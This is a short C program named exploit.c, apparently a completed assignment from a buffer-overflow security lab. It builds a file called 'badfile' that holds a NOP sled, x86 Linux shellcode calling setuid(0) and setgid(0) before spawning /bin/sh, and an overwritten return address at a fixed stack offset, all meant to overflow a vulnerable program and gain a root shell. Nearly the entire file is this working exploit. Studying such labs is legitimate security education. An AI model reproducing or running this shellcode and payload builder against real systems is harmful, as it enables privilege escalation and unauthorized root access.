/* exploit.c
*/
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
		"\x31\xdb\x89\xd8\xb0\x17\xcd\x80"      //setuid(0);
		"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80"      //setgid(0);
		"\x31\xc0"   /* xorl %eax,%eax */
		"\x50"       /* pushl %eax */
		"\x68""//sh"    /* pushl $0x68732f2f */
		"\x68""/bin"  /* pushl $0x6e69622f */
		"\x89\xe3"     /* movl  %esp,%ebx */
		"\x50"       /* pushl  %eax */
		"\x53"      /* pushl  %ebx */
		"\x89\xe1"    /* movl  %esp,%ecx  */
		"\x99"      /* cdq  */
		"\xb0\x0b"   /* movb   $0x0b,%al */
		"\xcd\x80"     /* int   $0x80  */
;

void main(int argc, char **argv)
{
	char buffer[200];
	FILE *badfile;
	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 200);
	/* You need to fill the return address field with a candidate
	entry point of the malicious shellcode (Part A)*/

	*((long*)(buffer+112))=(0xbfffec48+0x5c);
	//___________________________________________________
	/* Place the shellcode towards the end of the buffer by using
	memcpy function (Part B)*/
	memcpy(buffer+sizeof(buffer)-sizeof(shellcode),shellcode,sizeof(shellcode));

	//___________________________________________________
	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 200, 1, badfile);
	fclose(badfile);
}